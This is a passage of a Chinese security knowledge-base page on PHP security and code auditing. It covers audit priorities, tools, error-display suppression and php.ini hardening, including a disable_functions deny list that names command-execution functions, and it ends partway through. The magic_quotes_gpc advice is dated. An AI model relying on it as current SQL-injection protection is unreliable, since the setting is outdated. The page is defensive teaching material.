<!DOCTYPE html>
<html lang="en-US">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
    <title>PHP安全相关 | 狼组安全团队公开知识库</title>
    <meta name="description" content="">
    <meta name="generator" content="VuePress 1.7.1">
    <link rel="icon" href="/assets/logo.svg">
    <script type="text/javascript" src="/assets/js/push.js"></script>
    <meta name="description" content="致力于打造信息安全乌托邦">
    <meta name="referrer" content="never">
    <meta name="keywords" content="知识库,公开知识库,狼组,狼组安全团队知识库,knowledge">
    <link rel="preload" href="/assets/css/0.styles.14418092.css" as="style"><link rel="preload" href="/assets/js/app.ce545bc8.js" as="script"><link rel="preload" href="/assets/js/2.c70695c7.js" as="script"><link rel="preload" href="/assets/js/99.78c0c4bc.js" as="script"><link rel="prefetch" href="/assets/js/10.29376229.js"><link rel="prefetch" href="/assets/js/100.cf6cacdc.js"><link rel="prefetch" href="/assets/js/101.f1932381.js"><link rel="prefetch" href="/assets/js/102.5a622813.js"><link rel="prefetch" href="/assets/js/103.e27f20b5.js"><link rel="prefetch" href="/assets/js/104.cbd42872.js"><link rel="prefetch" href="/assets/js/105.0902bc7f.js"><link rel="prefetch" href="/assets/js/11.cc7c3ffe.js"><link rel="prefetch" href="/assets/js/12.4b2c1481.js"><link rel="prefetch" href="/assets/js/13.e984f587.js"><link rel="prefetch" href="/assets/js/14.70adfc13.js"><link rel="prefetch" href="/assets/js/15.c068ae37.js"><link rel="prefetch" href="/assets/js/16.71dce394.js"><link rel="prefetch" href="/assets/js/17.71edacb7.js"><link rel="prefetch" href="/assets/js/18.4f445222.js"><link rel="prefetch" href="/assets/js/19.52767f48.js"><link rel="prefetch" href="/assets/js/20.27029d68.js"><link rel="prefetch" href="/assets/js/21.c4408352.js"><link rel="prefetch" href="/assets/js/22.833c2fa3.js"><link rel="prefetch" href="/assets/js/23.2dd6d6b2.js"><link rel="prefetch" href="/assets/js/24.01ebded3.js"><link rel="prefetch" href="/assets/js/25.79047875.js"><link rel="prefetch" href="/assets/js/26.b1d20335.js"><link rel="prefetch" href="/assets/js/27.d94bae34.js"><link rel="prefetch" href="/assets/js/28.24832b00.js"><link rel="prefetch" href="/assets/js/29.00756333.js"><link rel="prefetch" href="/assets/js/3.f83c4657.js"><link rel="prefetch" href="/assets/js/30.b5f7ae4b.js"><link rel="prefetch" href="/assets/js/31.ac3a12fb.js"><link rel="prefetch" href="/assets/js/32.f6a4232a.js"><link rel="prefetch" href="/assets/js/33.64c25482.js"><link rel="prefetch" href="/assets/js/34.d23fa41a.js"><link rel="prefetch" href="/assets/js/35.fb2c90a7.js"><link rel="prefetch" href="/assets/js/36.76b2e1af.js"><link rel="prefetch" href="/assets/js/37.4f80f620.js"><link rel="prefetch" href="/assets/js/38.f15aea29.js"><link rel="prefetch" href="/assets/js/39.36696d21.js"><link rel="prefetch" href="/assets/js/4.5e9d1420.js"><link rel="prefetch" href="/assets/js/40.266866df.js"><link rel="prefetch" href="/assets/js/41.b803af90.js"><link rel="prefetch" href="/assets/js/42.ee39695c.js"><link rel="prefetch" href="/assets/js/43.ff07cc4d.js"><link rel="prefetch" href="/assets/js/44.c8797d74.js"><link rel="prefetch" href="/assets/js/45.58ffcf8b.js"><link rel="prefetch" href="/assets/js/46.f5756fd2.js"><link rel="prefetch" href="/assets/js/47.6ec74bf3.js"><link rel="prefetch" href="/assets/js/48.ccab1bc4.js"><link rel="prefetch" href="/assets/js/49.8b14740d.js"><link rel="prefetch" href="/assets/js/5.defb2e1e.js"><link rel="prefetch" href="/assets/js/50.22e503d0.js"><link rel="prefetch" href="/assets/js/51.76646080.js"><link rel="prefetch" href="/assets/js/52.2212d8a6.js"><link rel="prefetch" href="/assets/js/53.a2d31a64.js"><link rel="prefetch" href="/assets/js/54.32d2248d.js"><link rel="prefetch" href="/assets/js/55.93d82de4.js"><link rel="prefetch" href="/assets/js/56.f836c483.js"><link rel="prefetch" href="/assets/js/57.a1de6bba.js"><link rel="prefetch" href="/assets/js/58.a88c9d9d.js"><link rel="prefetch" href="/assets/js/59.d3433e64.js"><link rel="prefetch" href="/assets/js/6.9517d513.js"><link rel="prefetch" href="/assets/js/60.fef4884c.js"><link rel="prefetch" href="/assets/js/61.660833d4.js"><link rel="prefetch" href="/assets/js/62.e38fc1b2.js"><link rel="prefetch" href="/assets/js/63.604fbc9a.js"><link rel="prefetch" href="/assets/js/64.9307cba9.js"><link rel="prefetch" href="/assets/js/65.91532488.js"><link rel="prefetch" href="/assets/js/66.3432a358.js"><link rel="prefetch" href="/assets/js/67.719d7900.js"><link rel="prefetch" href="/assets/js/68.b95d6b7f.js"><link rel="prefetch" href="/assets/js/69.54b49522.js"><link rel="prefetch" href="/assets/js/7.cafd728d.js"><link rel="prefetch" href="/assets/js/70.b5e3c759.js"><link rel="prefetch" href="/assets/js/71.b321dc3b.js"><link rel="prefetch" href="/assets/js/72.79fd84a3.js"><link rel="prefetch" href="/assets/js/73.cac1bac6.js"><link rel="prefetch" href="/assets/js/74.1104f648.js"><link rel="prefetch" href="/assets/js/75.4e1b9a3a.js"><link rel="prefetch" href="/assets/js/76.4d9886f8.js"><link rel="prefetch" href="/assets/js/77.1979b4d2.js"><link rel="prefetch" href="/assets/js/78.cd2ff107.js"><link rel="prefetch" href="/assets/js/79.4c6e4656.js"><link rel="prefetch" href="/assets/js/8.e016c1e2.js"><link rel="prefetch" href="/assets/js/80.9a5bd5ba.js"><link rel="prefetch" href="/assets/js/81.f71e8a2c.js"><link rel="prefetch" href="/assets/js/82.e6fa23bf.js"><link rel="prefetch" href="/assets/js/83.4d328ec6.js"><link rel="prefetch" href="/assets/js/84.f207f5dc.js"><link rel="prefetch" href="/assets/js/85.4a29d0a8.js"><link rel="prefetch" href="/assets/js/86.b95f6e1a.js"><link rel="prefetch" href="/assets/js/87.e9fe5de6.js"><link rel="prefetch" href="/assets/js/88.489d81ec.js"><link rel="prefetch" href="/assets/js/89.c1866db3.js"><link rel="prefetch" href="/assets/js/9.402cfd6c.js"><link rel="prefetch" href="/assets/js/90.e652da61.js"><link rel="prefetch" href="/assets/js/91.1ef3252f.js"><link rel="prefetch" href="/assets/js/92.60703a4d.js"><link rel="prefetch" href="/assets/js/93.e61da203.js"><link rel="prefetch" href="/assets/js/94.127aff64.js"><link rel="prefetch" href="/assets/js/95.6d8eb784.js"><link rel="prefetch" href="/assets/js/96.700c9846.js"><link rel="prefetch" href="/assets/js/97.13c75758.js"><link rel="prefetch" href="/assets/js/98.4ba92898.js">
    <link rel="stylesheet" href="/assets/css/0.styles.14418092.css">
  </head>
  <body>
    <div id="app" data-server-rendered="true"><div class="theme-container"><header class="navbar"><div class="ant-row"><div class="sidebar-button"><i aria-label="icon: bars" class="anticon anticon-bars"><svg viewBox="0 0 1024 1024" focusable="false" data-icon="bars" width="1em" height="1em" fill="currentColor" aria-hidden="true"><path d="M912 192H328c-4.4 0-8 3.6-8 8v56c0 4.4 3.6 8 8 8h584c4.4 0 8-3.6 8-8v-56c0-4.4-3.6-8-8-8zm0 284H328c-4.4 0-8 3.6-8 8v56c0 4.4 3.6 8 8 8h584c4.4 0 8-3.6 8-8v-56c0-4.4-3.6-8-8-8zm0 284H328c-4.4 0-8 3.6-8 8v56c0 4.4 3.6 8 8 8h584c4.4 0 8-3.6 8-8v-56c0-4.4-3.6-8-8-8zM104 228a56 56 0 1 0 112 0 56 56 0 1 0-112 0zm0 284a56 56 0 1 0 112 0 56 56 0 1 0-112 0zm0 284a56 56 0 1 0 112 0 56 56 0 1 0-112 0z"></path></svg></i> <span></span></div> <div class="ant-col ant-col-xs-24 ant-col-sm-24 ant-col-md-6 ant-col-lg-5 ant-col-xl-5 ant-col-xxl-4"><a href="/" class="router-link-active home-link"><img src="/assets/logo.svg" alt="狼组安全团队公开知识库" class="logo"> <span class="site-name">狼组安全团队公开知识库</span></a> <div class="search-box mobile-search"><input aria-label="Search" autocomplete="off" spellcheck="false" value=""> <!----></div></div> <div class="ant-col ant-col-xs-0 ant-col-sm-0 ant-col-md-18 ant-col-lg-19 ant-col-xl-19 ant-col-xxl-20"><div class="search-box"><input aria-label="Search" autocomplete="off" spellcheck="false" value=""> <!----></div> <nav class="nav-links can-hide"><ul role="menu" id="nav" class="ant-menu ant-menu-horizontal ant-menu-root ant-menu-light"><li role="menuitem" class="ant-menu-submenu ant-menu-submenu-horizontal ant-menu-overflowed-submenu" style="display:none;"><div aria-haspopup="true" class="ant-menu-submenu-title"><span>···</span><i class="ant-menu-submenu-arrow"></i></div></li><li role="menuitem" mode="horizontal" level="1" inlineIndent="24" renderMenuItem="function () { [native code] }" rootPrefixCls="ant-menu" index="0" parentMenu="[object Object]" manualRef="function () { [native code] }" eventKey="/" openTransitionName="slide-up" openKeys="" selectedKeys="/knowledge/web/" triggerSubMenuAction="hover" subMenuKey="0-menu-" class="ant-menu-item"><a href="/" class="router-link-active">
          首页
        </a></li><li role="menuitem" class="ant-menu-submenu ant-menu-submenu-horizontal ant-menu-overflowed-submenu" style="display:none;"><div aria-haspopup="true" class="ant-menu-submenu-title"><span>···</span><i class="ant-menu-submenu-arrow"></i></div></li><li role="menuitem" mode="horizontal" level="1" inlineIndent="24" renderMenuItem="function () { [native code] }" rootPrefixCls="ant-menu" index="1" parentMenu="[object Object]" manualRef="function () { [native code] }" eventKey="/guide/" openTransitionName="slide-up" openKeys="" selectedKeys="/knowledge/web/" triggerSubMenuAction="hover" subMenuKey="0-menu-" class="ant-menu-item"><a href="/guide/">
          使用指南
        </a></li><li role="menuitem" class="ant-menu-submenu ant-menu-submenu-horizontal ant-menu-overflowed-submenu" style="display:none;"><div aria-haspopup="true" class="ant-menu-submenu-title"><span>···</span><i class="ant-menu-submenu-arrow"></i></div></li><li role="menuitem" mode="horizontal" level="1" inlineIndent="24" renderMenuItem="function () { [native code] }" rootPrefixCls="ant-menu" index="2" parentMenu="[object Object]" manualRef="function () { [native code] }" eventKey="/knowledge/" openTransitionName="slide-up" openKeys="" selectedKeys="/knowledge/web/" triggerSubMenuAction="hover" subMenuKey="0-menu-" class="ant-menu-item"><a href="/knowledge/" class="router-link-active">
          知识库
        </a></li><li role="menuitem" class="ant-menu-submenu ant-menu-submenu-horizontal ant-menu-overflowed-submenu" style="display:none;"><div aria-haspopup="true" class="ant-menu-submenu-title"><span>···</span><i class="ant-menu-submenu-arrow"></i></div></li><li role="menuitem" mode="horizontal" level="1" inlineIndent="24" renderMenuItem="function () { [native code] }" rootPrefixCls="ant-menu" index="3" parentMenu="[object Object]" manualRef="function () { [native code] }" eventKey="/guide/how-to-contribute.html" openTransitionName="slide-up" openKeys="" selectedKeys="/knowledge/web/" triggerSubMenuAction="hover" subMenuKey="0-menu-" class="ant-menu-item"><a href="/guide/how-to-contribute.html">
          投稿文章
        </a></li><li role="menuitem" class="ant-menu-submenu ant-menu-submenu-horizontal ant-menu-overflowed-submenu" style="display:none;"><div aria-haspopup="true" class="ant-menu-submenu-title"><span>···</span><i class="ant-menu-submenu-arrow"></i></div></li><li role="menuitem" mode="horizontal" level="1" inlineIndent="24" renderMenuItem="function () { [native code] }" rootPrefixCls="ant-menu" index="4" parentMenu="[object Object]" manualRef="function () { [native code] }" eventKey="/guide/changelog.html" openTransitionName="slide-up" openKeys="" selectedKeys="/knowledge/web/" triggerSubMenuAction="hover" subMenuKey="0-menu-" class="ant-menu-item"><a href="/guide/changelog.html">
          更新日志
        </a></li><li role="menuitem" class="ant-menu-submenu ant-menu-submenu-horizontal ant-menu-overflowed-submenu" style="display:none;"><div aria-haspopup="true" class="ant-menu-submenu-title"><span>···</span><i class="ant-menu-submenu-arrow"></i></div></li><li role="menuitem" mode="horizontal" level="1" inlineIndent="24" renderMenuItem="function () { [native code] }" rootPrefixCls="ant-menu" index="5" parentMenu="[object Object]" manualRef="function () { [native code] }" eventKey="/opensource/" openTransitionName="slide-up" openKeys="" selectedKeys="/knowledge/web/" triggerSubMenuAction="hover" subMenuKey="0-menu-" class="ant-menu-item"><a href="/opensource/">
          开源项目
        </a></li><li role="menuitem" class="ant-menu-submenu ant-menu-submenu-horizontal ant-menu-overflowed-submenu" style="visibility:hidden;position:absolute;"><div aria-haspopup="true" class="ant-menu-submenu-title"><span>···</span><i class="ant-menu-submenu-arrow"></i></div></li></ul> <a href="https://github.com/wgpsec" target="_blank" rel="noopener noreferrer" class="repo-link"><i aria-label="icon: github" class="anticon anticon-github"><svg viewBox="64 64 896 896" focusable="false" data-icon="github" width="1em" height="1em" fill="currentColor" aria-hidden="true"><path d="M511.6 76.3C264.3 76.2 64 276.4 64 523.5 64 718.9 189.3 885 363.8 946c23.5 5.9 19.9-10.8 19.9-22.2v-77.5c-135.7 15.9-141.2-73.9-150.3-88.9C215 726 171.5 718 184.5 703c30.9-15.9 62.4 4 98.9 57.9 26.4 39.1 77.9 32.5 104 26 5.7-23.5 17.9-44.5 34.7-60.8-140.6-25.2-199.2-111-199.2-213 0-49.5 16.3-95 48.3-131.7-20.4-60.5 1.9-112.3 4.9-120 58.1-5.2 118.5 41.6 123.2 45.3 33-8.9 70.7-13.6 112.9-13.6 42.4 0 80.2 4.9 113.5 13.9 11.3-8.6 67.3-48.8 121.3-43.9 2.9 7.7 24.7 58.3 5.5 118 32.4 36.8 48.9 82.7 48.9 132.3 0 102.2-59 188.1-200 212.9a127.5 127.5 0 0 1 38.1 91v112.5c.8 9 0 17.9 15 17.9 177.1-59.7 304.6-227 304.6-424.1 0-247.2-200.4-447.3-447.5-447.3z"></path></svg></i></a></nav></div></div> <!----></header> <aside class="sidebar"><div><div class="ads"><div id="ads_3"><div class="ads_title">赞助商</div> <button type="button" class="ant-btn ant-btn-primary ant-btn-background-ghost"><span>成为赞助商</span></button></div></div> <div role="separator" id="reset-margin" class="ant-divider ant-divider-horizontal ant-divider-dashed"></div></div> <ul class="sidebar-links"><li><a href="/knowledge/" aria-current="page" title="知识库广告位招租" class="sidebar-link">知识库广告位招租</a></li><li><section class="sidebar-group collapsable depth-0"><p class="sidebar-heading"><span>基础知识</span> <span class="arrow right"><i aria-label="icon: down" class="anticon anticon-down"><svg viewBox="64 64 896 896" focusable="false" data-icon="down" width="1em" height="1em" fill="currentColor" aria-hidden="true"><path d="M884 256h-75c-5.1 0-9.9 2.5-12.9 6.6L512 654.2 227.9 262.6c-3-4.1-7.8-6.6-12.9-6.6h-75c-6.5 0-10.3 7.4-6.5 12.7l352.6 486.1c12.8 17.6 39 17.6 51.7 0l352.6-486.1c3.9-5.3.1-12.7-6.4-12.7z"></path></svg></i></span></p> <!----></section></li><li><section class="sidebar-group collapsable depth-0"><p class="sidebar-heading"><span>工具手册</span> <span class="arrow right"><i aria-label="icon: down" class="anticon anticon-down"><svg viewBox="64 64 896 896" focusable="false" data-icon="down" width="1em" height="1em" fill="currentColor" aria-hidden="true"><path d="M884 256h-75c-5.1 0-9.9 2.5-12.9 6.6L512 654.2 227.9 262.6c-3-4.1-7.8-6.6-12.9-6.6h-75c-6.5 0-10.3 7.4-6.5 12.7l352.6 486.1c12.8 17.6 39 17.6 51.7 0l352.6-486.1c3.9-5.3.1-12.7-6.4-12.7z"></path></svg></i></span></p> <!----></section></li><li><section class="sidebar-group collapsable depth-0"><p class="sidebar-heading open"><span>Web安全</span> <span class="arrow down"><i aria-label="icon: down" class="anticon anticon-down"><svg viewBox="64 64 896 896" focusable="false" data-icon="down" width="1em" height="1em" fill="currentColor" aria-hidden="true"><path d="M884 256h-75c-5.1 0-9.9 2.5-12.9 6.6L512 654.2 227.9 262.6c-3-4.1-7.8-6.6-12.9-6.6h-75c-6.5 0-10.3 7.4-6.5 12.7l352.6 486.1c12.8 17.6 39 17.6 51.7 0l352.6-486.1c3.9-5.3.1-12.7-6.4-12.7z"></path></svg></i></span></p> <ul class="sidebar-links sidebar-group-items"><li><a href="/knowledge/web/" aria-current="page" title="分类简介" class="sidebar-link">分类简介</a></li><li><a href="/knowledge/web/sql-injection.html" title="SQL注入漏洞" class="sidebar-link">SQL注入漏洞</a></li><li><a href="/knowledge/web/xss.html" title="XSS跨站脚本漏洞" class="sidebar-link">XSS跨站脚本漏洞</a></li><li><a href="/knowledge/web/expression-language-injection.html" title="表达式注入" class="sidebar-link">表达式注入</a></li><li><a href="/knowledge/web/xxe.html" title="XXE注入漏洞" class="sidebar-link">XXE注入漏洞</a></li><li><a href="/knowledge/web/source-leaked.html" title="源码泄露" class="sidebar-link">源码泄露</a></li><li><a href="/knowledge/web/code-injection.html" title="命令注入漏洞" class="sidebar-link">命令注入漏洞</a></li><li><a href="/knowledge/web/csrf-ssrf.html" title="请求伪造漏洞" class="sidebar-link">请求伪造漏洞</a></li><li><a href="/knowledge/web/file-download.html" title="任意文件下载漏洞" class="sidebar-link">任意文件下载漏洞</a></li><li><a href="/knowledge/web/file-includes.html" title="文件包含漏洞" class="sidebar-link">文件包含漏洞</a></li><li><a href="/knowledge/web/file-upload.html" title="文件上传漏洞" class="sidebar-link">文件上传漏洞</a></li><li><a href="/knowledge/web/jwt-cookie.html" title="JWT-Cookie伪造" class="sidebar-link">JWT-Cookie伪造</a></li><li><a href="/knowledge/web/logical-vulns.html" title="逻辑漏洞挖掘" class="sidebar-link">逻辑漏洞挖掘</a></li><li><a href="/knowledge/web/phpsec.html" aria-current="page" title="PHP安全相关" class="active sidebar-link">PHP安全相关</a><ul class="sidebar-sub-headers"><li class="sidebar-sub-header"><a href="/knowledge/web/phpsec.html#例题" title="例题：" class="sidebar-link">例题：</a><ul class="sidebar-sub-headers"><li class="sidebar-sub-header"><a href="/knowledge/web/phpsec.html#_1、system命令执行函数绕过" title="1、system命令执行函数绕过" class="sidebar-link">1、system命令执行函数绕过</a></li><li class="sidebar-sub-header"><a href="/knowledge/web/phpsec.html#_2、glob-数据流包装器" title="2、glob:// 数据流包装器" class="sidebar-link">2、glob:// 数据流包装器</a></li><li class="sidebar-sub-header"><a href="/knowledge/web/phpsec.html#利用dl-函数" title="利用DL()函数" class="sidebar-link">利用DL()函数</a></li><li class="sidebar-sub-header"><a href="/knowledge/web/phpsec.html#ld-preload-环境变量" title="LD_PRELOAD 环境变量" class="sidebar-link">LD_PRELOAD 环境变量</a></li><li class="sidebar-sub-header"><a href="/knowledge/web/phpsec.html#fastcgi-php-fpm" title="Fastcgi/PHP-FPM" class="sidebar-link">Fastcgi/PHP-FPM</a></li><li class="sidebar-sub-header"><a href="/knowledge/web/phpsec.html#apache-mod-cgi" title="Apache Mod CGI" class="sidebar-link">Apache Mod CGI</a></li><li class="sidebar-sub-header"><a href="/knowledge/web/phpsec.html#通过antsword看绕过disable-functions" title="通过Antsword看绕过disable_functions" class="sidebar-link">通过Antsword看绕过disable_functions</a></li></ul></li></ul></li><li><a href="/knowledge/web/same-origin-policy.html" title="同源策略和域安全" class="sidebar-link">同源策略和域安全</a></li><li><a href="/knowledge/web/session-sec.html" title="会话管理漏洞" class="sidebar-link">会话管理漏洞</a></li></ul></section></li><li><section class="sidebar-group collapsable depth-0"><p class="sidebar-heading"><span>CTF</span> <span class="arrow right"><i aria-label="icon: down" class="anticon anticon-down"><svg viewBox="64 64 896 896" focusable="false" data-icon="down" width="1em" height="1em" fill="currentColor" aria-hidden="true"><path d="M884 256h-75c-5.1 0-9.9 2.5-12.9 6.6L512 654.2 227.9 262.6c-3-4.1-7.8-6.6-12.9-6.6h-75c-6.5 0-10.3 7.4-6.5 12.7l352.6 486.1c12.8 17.6 39 17.6 51.7 0l352.6-486.1c3.9-5.3.1-12.7-6.4-12.7z"></path></svg></i></span></p> <!----></section></li><li><section class="sidebar-group collapsable depth-0"><p class="sidebar-heading"><span>渗透测试</span> <span class="arrow right"><i aria-label="icon: down" class="anticon anticon-down"><svg viewBox="64 64 896 896" focusable="false" data-icon="down" width="1em" height="1em" fill="currentColor" aria-hidden="true"><path d="M884 256h-75c-5.1 0-9.9 2.5-12.9 6.6L512 654.2 227.9 262.6c-3-4.1-7.8-6.6-12.9-6.6h-75c-6.5 0-10.3 7.4-6.5 12.7l352.6 486.1c12.8 17.6 39 17.6 51.7 0l352.6-486.1c3.9-5.3.1-12.7-6.4-12.7z"></path></svg></i></span></p> <!----></section></li><li><section class="sidebar-group collapsable depth-0"><p class="sidebar-heading"><span>组件漏洞</span> <span class="arrow right"><i aria-label="icon: down" class="anticon anticon-down"><svg viewBox="64 64 896 896" focusable="false" data-icon="down" width="1em" height="1em" fill="currentColor" aria-hidden="true"><path d="M884 256h-75c-5.1 0-9.9 2.5-12.9 6.6L512 654.2 227.9 262.6c-3-4.1-7.8-6.6-12.9-6.6h-75c-6.5 0-10.3 7.4-6.5 12.7l352.6 486.1c12.8 17.6 39 17.6 51.7 0l352.6-486.1c3.9-5.3.1-12.7-6.4-12.7z"></path></svg></i></span></p> <!----></section></li><li><section class="sidebar-group collapsable depth-0"><p class="sidebar-heading"><span>代码审计</span> <span class="arrow right"><i aria-label="icon: down" class="anticon anticon-down"><svg viewBox="64 64 896 896" focusable="false" data-icon="down" width="1em" height="1em" fill="currentColor" aria-hidden="true"><path d="M884 256h-75c-5.1 0-9.9 2.5-12.9 6.6L512 654.2 227.9 262.6c-3-4.1-7.8-6.6-12.9-6.6h-75c-6.5 0-10.3 7.4-6.5 12.7l352.6 486.1c12.8 17.6 39 17.6 51.7 0l352.6-486.1c3.9-5.3.1-12.7-6.4-12.7z"></path></svg></i></span></p> <!----></section></li></ul></aside> <main class="page"> <div class="theme-antdocs-content content__default"><h1 id="php安全相关">PHP安全相关 <a href="#php安全相关" class="header-anchor">#</a></h1> <h1 id="何为代码审计">何为代码审计？ <a href="#何为代码审计" class="header-anchor">#</a></h1> <p>代码审计（Code audit）是一种以发现程序错误，安全漏洞和违反程序规范为目标的源代码分析。</p> <p>内容包括：</p> <blockquote><ol><li>前后台分离的运行架构</li> <li>Web服务的目录权限分类</li> <li>认证会话与应用平台的结合</li> <li>数据库的配置规范</li> <li>SQL语句的编写规范</li> <li>Web服务的权限配置</li> <li>对抗爬虫引擎的处理措施</li></ol></blockquote> <h1 id="你审计的关键点">你审计的关键点？ <a href="#你审计的关键点" class="header-anchor">#</a></h1> <blockquote><p><strong>！！！首先要搞清楚目录结构，程序有哪些功能，查看 config 配置文件！！！</strong></p> <p>一、如果是CMS，搜索公开漏洞，对比同版本文件差异</p> <p>二、查看敏感函数、回溯变量，判断变量在调用前是否经过安全过滤</p> <p>三、查看公共函数、过滤函数是否存在漏洞和可绕过的点</p> <p>​		函数命名上会包含<code>common</code>、<code>function</code>、<code>filter</code>、<code>safe</code>、<code>check</code>等关键词</p> <p>四、查看敏感功能点，正向追踪变量传递过程，重点关注用户可控变量</p></blockquote> <h1 id="参考链接"><a href="https://wooyun.js.org/drops/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%85%A5%E9%97%A8%E6%80%BB%E7%BB%93.html" target="_blank" rel="noopener noreferrer">参考链接<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a> <a href="#参考链接" class="header-anchor">#</a></h1> <h1 id="你用什么工具提高效率">你用什么工具提高效率？ <a href="#你用什么工具提高效率" class="header-anchor">#</a></h1> <p>Fortify</p> <p><strong>submile代码审计插件</strong></p> <p><a href="https://github.com/5alt/VulHint" target="_blank" rel="noopener noreferrer">VulHint<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></p> <p><a href="https://github.com/WangYihang/Find-PHP-Vulnerabilities" target="_blank" rel="noopener noreferrer">Find-PHP-Vulnerabilities<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></p> <h1 id="为什么有的时候没有错误回显-用php举例">为什么有的时候没有错误回显，用php举例 <a href="#为什么有的时候没有错误回显-用php举例" class="header-anchor">#</a></h1> <blockquote><p>php的配置文件php.ini进行了修改，display_errors = On 修改为 display_errors = off时候就没有报错提示。</p> <p>在php脚本开头添加error_reporting(0); 也可以达到关闭报错的作用</p> <p>除了上面的，还可以在执行语句前面添加@</p></blockquote> <h1 id="php-ini可以设置哪些安全特性">php.ini可以设置哪些安全特性 <a href="#php-ini可以设置哪些安全特性" class="header-anchor">#</a></h1> <h3 id="关闭错误回显"><strong>关闭错误回显</strong> <a href="#关闭错误回显" class="header-anchor">#</a></h3> <p>防止利用错误信息反馈获取网站敏感信息</p> <h3 id="设置open-basedir-var-www-html"><strong>设置open_basedir</strong>= /var/www/html <a href="#设置open-basedir-var-www-html" class="header-anchor">#</a></h3> <p>限制 PHP 脚本能访问的目录，一定程度下可降低Webshell的危害</p> <h3 id="禁用危险函数"><strong>禁用危险函数</strong> <a href="#禁用危险函数" class="header-anchor">#</a></h3> <p>如果不希望执行包括<code>system()</code>等在内的执行命令的 PHP 函数</p> <p>以及能够查看 PHP 信息的<code>phpinfo()</code>等函数</p> <p>可以通过以下设置禁止这些函数</p> <div class="language-php line-numbers-mode"><pre class="language-php"><code>disable_functions <span class="token operator">=</span> phpinfo<span class="token punctuation">,</span> system<span class="token punctuation">,</span> passthru<span class="token punctuation">,</span> exec<span class="token punctuation">,</span> shell_exec<span class="token punctuation">,</span> popen<span class="token punctuation">,</span> escapeshellarg<span class="token punctuation">,</span> escapeshellcmd<span class="token punctuation">,</span> proc_close<span class="token punctuation">,</span> proc_open<span class="token punctuation">,</span> dl
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><h3 id="打开magic-quotes-gpc魔术引号"><strong>打开magic_quotes_gpc魔术引号</strong> <a href="#打开magic-quotes-gpc魔术引号" class="header-anchor">#</a></h3> <div class="language-php line-numbers-mode"><pre class="language-php"><code>magic_quotes_gpc <span class="token operator">=</span> on
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>魔术引号自动过滤 GET/POST/COOKIE 可以防止SQL注入</p> <p>但是 php&lt;5.4不会处理$_SERVER(client-ip/referer注入)  详情参见<a href="https://www.seebug.org/vuldb/ssvid-30102" target="_blank" rel="noopener noreferrer">CVE-2012-0831<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></p> <h3 id="关闭注册全局变量"><strong>关闭注册全局变量</strong> <a href="#关闭注册全局变量" class="header-anchor">#</a></h3> <p>在 PHP 环境中提交的变量，包括使用 POST 或者 GET 命令提交的变量</p> <p>都将自动注册为全局变量，能够被直接访问 (PHP&lt;5.4.0)。</p> <p>这对服务器是非常不安全的，应该将注册全局变量的选项关闭，禁止将所提交的变量注册为全局变量。</p> <div class="language-php line-numbers-mode"><pre class="language-php"><code>register_globals <span class="token operator">=</span> off
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><h3 id="关闭-php-版本信息在-http-头中的泄露"><strong>关闭 PHP 版本信息在 HTTP 头中的泄露</strong> <a href="#关闭-php-版本信息在-http-头中的泄露" class="header-anchor">#</a></h3> <p>为了防止黑客获取服务器中 PHP 版本的信息，可以禁止该信息在 HTTP 头部内容中泄露</p> <div class="language-php line-numbers-mode"><pre class="language-php"><code>expose_php <span class="token operator">=</span> off
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><h3 id="错误信息控制"><strong>错误信息控制</strong> <a href="#错误信息控制" class="header-anchor">#</a></h3> <p>一般 PHP 环境在没有连接到数据库或者其他情况下会有错误提示信息</p> <p>错误信息中可能包含 PHP 脚本当前的路径信息或者查询的 SQL 语句等信息</p> <p>这类信息如果暴露给黑客是不安全的，应该禁止该错误提示：</p> <div class="language-php line-numbers-mode"><pre class="language-php"><code>display_errors <span class="token operator">=</span> Off
